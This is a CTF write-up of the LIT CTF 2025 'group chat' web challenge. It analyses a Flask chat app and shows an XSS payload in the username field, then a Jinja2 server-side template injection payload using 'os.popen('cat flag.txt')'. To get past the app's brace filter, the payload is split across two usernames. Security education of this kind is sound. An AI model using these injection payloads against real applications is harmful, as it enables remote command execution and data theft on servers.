---
title: "web/group chat - Lexington Informatics Tournament CTF 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["flask", "web", "lit", "2025", "group-chat", "xss", "ssti", "jinja2", "lexington-informatics-tourname", "lexington-informatics-tournament-c", "ctf-writeup"]
summary: "We were also provided with the main.py file as part of this challenge."
source:
  name: "CTFtime writeup #40378"
  url: "https://ctftime.org/writeup/40378"
original_source: "https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat/README.md"
ctf:
  name: "Lexington Informatics Tournament CTF 2025"
  year: 2025
  challenge: "web/group chat"
---

## Metadata

- **CTF:** Lexington Informatics Tournament CTF 2025
- **Task:** web/group chat
- **Author team:** WhiteDukesDZ
- **CTFtime tags:** flask, web, lit, 2025, group-chat
- **CTFtime:** <https://ctftime.org/writeup/40378>
- **Original writeup:** <https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat/README.md>

---
# WhiteDukesDZ - LIT CTF 2025 Writeup: Group Chat Challenge

![WhiteDukesDZ Logo](<https://raw.githubusercontent.com/S450R1/lit-ctf-writeups/refs/heads/main/web/group-chat/challenge/web-group-chat.png>)

We were also provided with the `[main.py](http://main.py)` file as part of this challenge.

\---

## Challenge Summary

This challenge presented a simple Python Flask web application simulating a group chat. The goal was to analyze the application for vulnerabilities and exploit them to retrieve the flag.

## Provided Files  
\- `[main.py](http://main.py)` (Flask web app)  
\- Challenge image (see above)

## Application Analysis

After reviewing `[main.py](http://main.py)`, we identified three main endpoints:

1\. **`/` (Home):**  
\- If `username` is not set in the session, redirects to `/set_username`.  
\- Otherwise, renders the chat page.

2\. **`/set_username`:**  
\- Accepts `GET` and `POST` requests.  
\- On `GET`, displays a username form.  
\- On `POST`, verifies the provided `username`:  
\- If `username` length > 1000, registration is refused.  
\- If `username` contains both `{` and `}`, registration is refused.  
\- Otherwise, registration is accepted and redirects to `/`.

3\. **`/send_message`:**  
\- Accepts only `POST` requests with a `message`.  
\- If `username` is not set in session, redirects to `/set_username`.  
\- If `message` contains non-alphanumeric symbols, message is refused.  
\- Otherwise, message is added to `chat_logs` as `username: message` and redirects to `/`.

### Security Observations

\- The `/set_username` endpoint does not filter for XSS payloads in the `username` field. For example, setting `username` to `<script>alert('WhiteDukesDZ')</script>` and sending a message will execute the JavaScript payload:

![WhiteDukesDZ Logo](<https://raw.githubusercontent.com/S450R1/lit-ctf-writeups/refs/heads/main/web/group-chat/demonstration/xss.png>)

\- However, since the code executes only on the client side and there is no admin bot, this XSS cannot be leveraged to obtain the flag.

### Template Rendering

The chat logs are rendered as follows:

```python  
<div id="chat-box">''' + '  
'.join(chat_logs) + '''  
</div>  
```

If `chat_logs` is:

```python  
chat_logs = [  
"username1: message1",  
"username2: message2"  
]  
```

It will be rendered as:

```html  
username1: message1  
username2: message2  
```

And since we can control both `username1`, `message1`, `username2` and `message2` we certainly can cause a <ins>Server Side Template Injection</ins>

To confirm the possibility of a <ins>Server Side Template Injection (SSTI)</ins>, we can leverage our control over both `username` and `message` fields. This allows us to attempt injecting a Jinja2 payload that could execute server-side code.

**Local Testing:**  
1\. Create a `flag.txt` file in the same directory as `[main.py](http://main.py)`:  
```sh  
echo "FLAG{REDACTED}" > flag.txt  
```  
2\. Modify the template in `[main.py](http://main.py)` for the `/` route to include a test payload that reads the contents of `flag.txt`:  
```python  
<div>{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}</div>  
```  
3\. Run the Flask app locally:  
```sh  
python3 [main.py](http://main.py)  
```  
4\. Visit `http://localhost:5000`, set a `username`, and navigate to `/`. You should see the contents of `flag.txt` displayed on the page.

![WhiteDukesDZ Logo](<https://raw.githubusercontent.com/S450R1/lit-ctf-writeups/refs/heads/main/web/group-chat/demonstration/local-test.png>)

However, on the remote instance, we cannot modify `[main.py](http://main.py)` directly. Therefore, our goal is to inject a payload through user input that results in the template rendering something like:

```html  
{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}  
```

by carefully crafting the values of `username` and `message`.  
\---

## Solution

To exploit the SSTI vulnerability and retrieve the flag, our goal was to make the rendered chat log look like:

```python  
{{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}  
```

Since we control both `username` and `message`, we can split the payload across two users/messages. Our approach:

\- `username1 = {{cycler.__init__.__globals__.os.popen('cat flag.txt`  
\- `message1 = dummy`  
\- `username2 = '[:12]).read()}}`  
\- `message2 = dummy`

This results in the following template being rendered:

```python  
{{cycler.__init__.__globals__.os.popen('cat flag.txt:   
'[:12]).read()}}  
```

which is functionally equivalent to our intended payload, as the injected `  
` and extra characters are ignored by the Python slice.

We automated this process in `solution/[solve.py](http://solve.py)`. To run the exploit against the remote instance provided by LIT CTF:

```sh  
python3 [solve.py](http://solve.py)  
```

If successful, the script will output the flag:

```sh  
Username set successfully.  
Message sent successfully.  
Username set successfully.  
Message sent successfully.  
LITCTF{1m_g0nn4_h4v3_t0_d0_m0r3_t0_5t0p_7he_1n3v1t4bl3_f0rw4rd_br4c3_f0rw4rd_br4c3_b4ckw4rd_br4c3_b4ckw4rd_br4c3}  
```
